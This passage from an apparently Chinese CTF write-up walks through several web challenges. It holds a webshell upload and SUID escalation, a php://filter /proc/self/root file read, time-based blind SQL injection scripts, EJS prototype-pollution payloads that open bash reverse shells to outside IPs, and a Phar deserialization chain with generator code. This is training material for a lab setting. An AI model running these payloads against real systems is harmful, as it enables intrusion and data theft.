closedir($dh);</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    function dir_list($directory)</span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        $array = <span class="punctuation">[</span><span class="punctuation">]</span>;</span><br><span class="line"></span><br><span class="line">        $dir = dir($directory);</span><br><span class="line">        while ($file = $dir-&gt;read()) <span class="punctuation">&#123;</span></span><br><span class="line">            if ($file !== &#x27;.&#x27; &amp;&amp; $file !== &#x27;..&#x27;) <span class="punctuation">&#123;</span></span><br><span class="line">                $array<span class="punctuation">[</span><span class="punctuation">]</span> = $file;</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">        return $array;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    public function unzip()</span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        $fullpath = <span class="string">&quot;/var/www/html/&quot;</span>.$this-&gt;path.<span class="string">&quot;/&quot;</span>.$this-&gt;zip_name;</span><br><span class="line">        $white_list = <span class="punctuation">[</span>&#x27;jpg&#x27;<span class="punctuation">,</span>&#x27;png&#x27;<span class="punctuation">,</span>&#x27;gif&#x27;<span class="punctuation">,</span>&#x27;bmp&#x27;<span class="punctuation">]</span>;</span><br><span class="line">        $this-&gt;zip_manager-&gt;open($fullpath);</span><br><span class="line">        for ($i = <span class="number">0</span>;$i &lt; $this-&gt;zip_manager-&gt;count();$i ++) <span class="punctuation">&#123;</span></span><br><span class="line">            if (strstr($this-&gt;zip_manager-&gt;getNameIndex($i)<span class="punctuation">,</span><span class="string">&quot;../&quot;</span>))<span class="punctuation">&#123;</span></span><br><span class="line">                echo <span class="string">&quot;you bad bad&quot;</span>;</span><br><span class="line">                return <span class="literal"><span class="keyword">false</span></span>;</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">        if(!$this-&gt;zip_manager-&gt;extractTo($this-&gt;path))<span class="punctuation">&#123;</span></span><br><span class="line">            echo <span class="string">&quot;Unzip to /&quot;</span>.$this-&gt;path.<span class="string">&quot;/ failed&quot;</span>;</span><br><span class="line">            exit;</span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">        @unlink($fullpath);</span><br><span class="line">        $file_list = $this-&gt;dir_list(<span class="string">&quot;/var/www/html/&quot;</span>.$this-&gt;path.<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        for($i=<span class="number">0</span>;$i&lt;sizeof($file_list);$i++)<span class="punctuation">&#123;</span></span><br><span class="line">            if(is_dir($this-&gt;path.<span class="string">&quot;/&quot;</span>.$file_list<span class="punctuation">[</span>$i<span class="punctuation">]</span>))<span class="punctuation">&#123;</span></span><br><span class="line">                echo <span class="string">&quot;dir? I deleted all things in it&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;@$this-&gt;deldir(<span class="string">&quot;/var/www/html/&quot;</span>.$this-&gt;path.<span class="string">&quot;/&quot;</span>.$file_list<span class="punctuation">[</span>$i<span class="punctuation">]</span>);@rmdir(<span class="string">&quot;/var/www/html/&quot;</span>.$this-&gt;path.<span class="string">&quot;/&quot;</span>.$file_list<span class="punctuation">[</span>$i<span class="punctuation">]</span>);</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">            else<span class="punctuation">&#123;</span></span><br><span class="line">                if(!in_array(pathinfo($file_list<span class="punctuation">[</span>$i<span class="punctuation">]</span><span class="punctuation">,</span> PATHINFO_EXTENSION)<span class="punctuation">,</span>$white_list)) <span class="punctuation">&#123;</span>echo <span class="string">&quot;only image!!! I deleted it for you&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;@unlink(<span class="string">&quot;/var/www/html/&quot;</span>.$this-&gt;path.<span class="string">&quot;/&quot;</span>.$file_list<span class="punctuation">[</span>$i<span class="punctuation">]</span>);<span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">        return <span class="literal"><span class="keyword">true</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>创建一个不能解压的压缩包</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765440426343-9001b3f8-0ebf-4190-9c97-21b8c1c6f50b.png" alt="img"></p><p>这里解压失败</p><p>但是解压后部分文件后直接exit</p><p>从而绕过后续的unlink</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765440476641-10c14af2-7fe5-46cd-851e-a28b9795e129.png" alt="img"></p><p>&#x2F;4df1bef9d0c0ef26403ff10f6f431309&#x2F;she.php</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765440656533-38318d21-0cc5-4c0a-b0be-871e79d2d851.png" alt="img"></p><p>发现权限不够，于是提权</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm <span class="number">-4000</span> -print <span class="number">2</span>&gt;/dev/<span class="literal"><span class="keyword">null</span></span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765440729804-61501ad0-64e4-471a-ab1e-dc845bc0f024.png" alt="img"></p><p>nl有可读权限</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl /f*</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765442138195-eb18dd8b-656e-43a2-8f38-ff500cf55e38.png" alt="img"></p><h2 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>​</p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>跑脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://32a96c02-6636-425a-b16a-047c7164e64d.node5.buuoj.cn:81/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SQL_injection</span>():</span><br><span class="line">    res=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        mid=<span class="number">32</span></span><br><span class="line">        <span class="keyword">while</span> mid&lt;<span class="number">128</span>:</span><br><span class="line">            <span class="comment">#payload=&quot;&#x27;||if(ascii(mid((database()),%d,1))=%d,benchmark(2500000,sha(1)),0)||&#x27;&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#database()=ctf</span></span><br><span class="line">            <span class="comment">#payload=&quot;&#x27;||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),%d,1))=%d,benchmark(3000000,sha(1)),0)||&#x27;&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#flaggg,user</span></span><br><span class="line">            <span class="comment">#payload=&quot;&#x27;||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),%d,1))=%d,benchmark(3000000,sha(1)),0)||&#x27;&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#cmd</span></span><br><span class="line">            payload=<span class="string">&quot;&#x27;||if(ascii(mid((select(cmd)from(flaggg)),%d,1))=%d,benchmark(3000000,sha(1)),0)||&#x27;&quot;</span>%(i,mid)</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            begin_time=time.time()</span><br><span class="line">            data=&#123;<span class="string">&quot;username&quot;</span>:payload, <span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;</span><br><span class="line">            r=requests.post(url=url, data=data)</span><br><span class="line">            end_time=time.time()</span><br><span class="line">            <span class="comment">#print(end_time-begin_time)</span></span><br><span class="line">            <span class="keyword">if</span> (end_time-begin_time)&gt;<span class="number">1</span>:</span><br><span class="line">                res+=<span class="built_in">chr</span>(mid)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            mid+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    SQL_injection()</span><br></pre></td></tr></table></figure><h2 id="Really-Easy-SQL"><a href="#Really-Easy-SQL" class="headerlink" title="Really Easy SQL"></a>Really Easy SQL</h2><p>先试一下有没有过滤</p><p>发现输入什么都是报错</p><p>直接时间盲注吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://a521de12-f1b9-42f6-b179-2f488565741b.node5.buuoj.cn:81/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SQL_injection</span>():</span><br><span class="line">    res=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 外层循环：遍历字符位置（1到99，假设flag长度不超过99）</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">100</span>):</span><br><span class="line">        mid=<span class="number">32</span></span><br><span class="line">        <span class="comment"># 内层循环：遍历当前位置的可能ASCII码（32-127，覆盖所有可见字符）</span></span><br><span class="line">        <span class="keyword">while</span> mid&lt;<span class="number">128</span>:</span><br><span class="line">            <span class="comment">#payload=&quot;&#x27;||if(ascii(mid((database()),%d,1))=%d,benchmark(2500000,sha(1)),0)||&#x27;&quot;%(i,mid)  </span></span><br><span class="line">            <span class="comment">#database()=ctf            #payload=&quot;&#x27;||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),%d,1))=%d,benchmark(3000000,sha(1)),0)||&#x27;&quot;%(i,mid)            #flaggg,user            #payload=&quot;&#x27;||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),%d,1))=%d,benchmark(3000000,sha(1)),0)||&#x27;&quot;%(i,mid)            #cmd            payload=&quot;&#x27;||if(ascii(mid((select(cmd)from(flaggg)),%d,1))=%d,benchmark(3000000,sha(1)),0)||&#x27;&quot;%(i,mid)  </span></span><br><span class="line">            <span class="built_in">print</span>(payload)  </span><br><span class="line">            begin_time=time.time()  </span><br><span class="line">            data=&#123;<span class="string">&quot;username&quot;</span>:payload, <span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;  </span><br><span class="line">            r=requests.post(url=url, data=data)  </span><br><span class="line">            end_time=time.time()  </span><br><span class="line">            <span class="comment">#print(end_time-begin_time)  </span></span><br><span class="line">            <span class="keyword">if</span> (end_time-begin_time)&gt;<span class="number">1</span>:  </span><br><span class="line">                res+=<span class="built_in">chr</span>(mid)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">            mid+=<span class="number">1</span>  </span><br><span class="line">        <span class="keyword">if</span>(mid==<span class="number">128</span>):  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        <span class="built_in">print</span>(res)  </span><br><span class="line">    <span class="built_in">print</span>(res)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    SQL_injection()</span><br></pre></td></tr></table></figure><p>服务器一直卡爆<br>换for循环参数注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;790b46b0-7256-4c78-96be-2f2d043c3132&#125;</span><br></pre></td></tr></table></figure><h2 id="NodeSoEasy"><a href="#NodeSoEasy" class="headerlink" title="NodeSoEasy"></a>NodeSoEasy</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765443126260-136ebfd5-d98d-45f3-8b7e-65ddd97b2a57.png" alt="img"></p><p>用的ejs模板</p><p>&#x2F;目录下存在原型链污染</p><p>eJS RCE</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;client&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;escapeFunction&quot;</span><span class="punctuation">:</span><span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/124.222.136.33/1337 0&gt;&amp;1\&quot;&#x27;);&quot;</span><span class="punctuation">,</span><span class="attr">&quot;compileDebug&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>发包用application&#x2F;json</p><p>参考：<a href="https://www.anquanke.com/post/id/236354">https://www.anquanke.com/post/id/236354</a></p><p>BUU弹不了shell</p><p>暂时没招解决</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">9339894</span>c<span class="number">-2</span>cec<span class="number">-42</span>a6-a9f6-b8017abf9468.node5.buuoj.cn<span class="punctuation">:</span><span class="number">81</span></span><br><span class="line">Cache-Control<span class="punctuation">:</span> max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests<span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML<span class="punctuation">,</span> like Gecko) Chrome/<span class="number">122.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept<span class="punctuation">:</span> text/html<span class="punctuation">,</span>application/xhtml+xml<span class="punctuation">,</span>application/xml;q=<span class="number">0.9</span><span class="punctuation">,</span>image/avif<span class="punctuation">,</span>image/webp<span class="punctuation">,</span>image/apng<span class="punctuation">,</span>*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Accept-Language: zh,zh-CN;q=0.9</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment">Referer: http://9339894c-2cec-42a6-a9f6-b8017abf9468.node5.buuoj.cn:81/</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 145</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:&#123;&#125;,&quot;escapeFunction&quot;:&quot;1; require(&#x27;child_process&#x27;).exec(&#x27;bash -i &gt;&amp; /dev/tcp/10.88.15.15/1337 0&gt;&amp;1&#x27;);&quot;,&quot;compileDebug&quot;:true&#125;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="PharPOP"><a href="#PharPOP" class="headerlink" title="PharPOP"></a>PharPOP</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">function waf($data)<span class="punctuation">&#123;</span></span><br><span class="line">    if (is_array($data))<span class="punctuation">&#123;</span></span><br><span class="line">        die(<span class="string">&quot;Cannot transfer arrays&quot;</span>);</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="comment">// i表示大小写不敏感</span></span><br><span class="line">    if (preg_match(&#x27;/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i&#x27;<span class="punctuation">,</span> $data)) <span class="punctuation">&#123;</span></span><br><span class="line">        die(<span class="string">&quot;You can&#x27;t do&quot;</span>);</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">class air<span class="punctuation">&#123;</span></span><br><span class="line">    public $p;</span><br><span class="line"></span><br><span class="line">    public function __set($p<span class="punctuation">,</span> $value) <span class="punctuation">&#123;</span></span><br><span class="line">        $p = $this-&gt;p-&gt;act;</span><br><span class="line">        echo new $p($value);</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">class tree<span class="punctuation">&#123;</span></span><br><span class="line">    public $name;</span><br><span class="line">    public $act;</span><br><span class="line"></span><br><span class="line">    public function __destruct() <span class="punctuation">&#123;</span></span><br><span class="line">        return $this-&gt;name();</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    public function __call($name<span class="punctuation">,</span> $arg)<span class="punctuation">&#123;</span></span><br><span class="line">        $arg<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span> =$this-&gt;name-&gt;$name;</span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">class apple <span class="punctuation">&#123;</span></span><br><span class="line">    public $xxx;</span><br><span class="line">    public $flag;</span><br><span class="line">    public function __get($flag)</span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        $this-&gt;xxx-&gt;$flag = $this-&gt;flag;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">class D <span class="punctuation">&#123;</span></span><br><span class="line">    public $start;</span><br><span class="line"></span><br><span class="line">    public function __destruct()<span class="punctuation">&#123;</span></span><br><span class="line">        $data = $_POST<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>;</span><br><span class="line">        if ($this-&gt;start == &#x27;w&#x27;) <span class="punctuation">&#123;</span></span><br><span class="line">            waf($data);</span><br><span class="line">            $filename = <span class="string">&quot;/tmp/&quot;</span>.md5(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">            file_put_contents($filename<span class="punctuation">,</span> $data);</span><br><span class="line">            echo $filename;</span><br><span class="line">        <span class="punctuation">&#125;</span> else if ($this-&gt;start == &#x27;r&#x27;) <span class="punctuation">&#123;</span></span><br><span class="line">            waf($data);</span><br><span class="line">            $f = file_get_contents($data);</span><br><span class="line">            if($f)<span class="punctuation">&#123;</span></span><br><span class="line">                echo <span class="string">&quot;It is file&quot;</span>;</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">            else<span class="punctuation">&#123;</span></span><br><span class="line">                echo <span class="string">&quot;You can look at the others&quot;</span>;</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">class banana <span class="punctuation">&#123;</span></span><br><span class="line">    public function __get($name)<span class="punctuation">&#123;</span></span><br><span class="line">        return $this-&gt;$name;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// flag in /</span></span><br><span class="line"><span class="comment">//入口：POST[1]长度&lt;55则反序列化</span></span><br><span class="line">if(strlen($_POST<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span>) &lt; <span class="number">55</span>) <span class="punctuation">&#123;</span></span><br><span class="line">    $a = unserialize($_POST<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span>);</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">else<span class="punctuation">&#123;</span></span><br><span class="line">    echo <span class="string">&quot;str too long&quot;</span>;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">throw new Error(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tree._destruct-&gt;tree._call-&gt;apple._get-&gt;air._set</span><br></pre></td></tr></table></figure><p>然后绕过<code>throw</code>，throw会阻碍析构函数进行，通过gc垃圾回收提前触发析构函数</p><p>绕过<code>waf</code>，waf过滤了很多关键字，使用<code>gzip</code>命令处理phar文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class air<span class="punctuation">&#123;</span></span><br><span class="line">    public $p;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line">class tree<span class="punctuation">&#123;</span></span><br><span class="line">    public $name;</span><br><span class="line">    public $act;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line">class apple <span class="punctuation">&#123;</span></span><br><span class="line">    public $xxx;</span><br><span class="line">    public $flag;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$a = new tree;</span><br><span class="line">$b = new apple;</span><br><span class="line">$c = new air;</span><br><span class="line">$d = new tree;</span><br><span class="line"><span class="comment">// $d-&gt;act=&#x27;FilesystemIterator&#x27;;</span></span><br><span class="line"><span class="comment">// $c-&gt;p = $d;</span></span><br><span class="line"><span class="comment">// $b-&gt;xxx = $c;</span></span><br><span class="line"><span class="comment">// $b-&gt;flag = &#x27;glob:///*f*&#x27;;</span></span><br><span class="line"><span class="comment">// $a-&gt;name = $b;</span></span><br><span class="line">$d-&gt;act=&#x27;SplFileObject&#x27;;</span><br><span class="line">$c-&gt;p = $d;</span><br><span class="line">$b-&gt;xxx = $c;</span><br><span class="line">$b-&gt;flag = <span class="string">&quot;/fflaggg&quot;</span>;</span><br><span class="line">$a-&gt;name = $b;</span><br><span class="line"> </span><br><span class="line">$phar = new Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span><span class="punctuation">,</span> <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件,随便新建一个文件内容随意</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>生成的phar文件在010editor中打开，删去最后一个}<br> 修改签名并压缩phar文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import sha1</span><br><span class="line">f = open(&#x27;phar.phar&#x27;<span class="punctuation">,</span> &#x27;rb&#x27;).read() # 修改内容后的phar文件</span><br><span class="line">s = f<span class="punctuation">[</span><span class="punctuation">:</span><span class="number">-28</span><span class="punctuation">]</span> # 获取要签名的数据</span><br><span class="line">h = f<span class="punctuation">[</span><span class="number">-8</span><span class="punctuation">:</span><span class="punctuation">]</span> # 获取签名类型以及GBMB标识</span><br><span class="line">newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB</span><br><span class="line">open(&#x27;fixed_phar.phar&#x27;<span class="punctuation">,</span> &#x27;wb&#x27;).write(newf) # 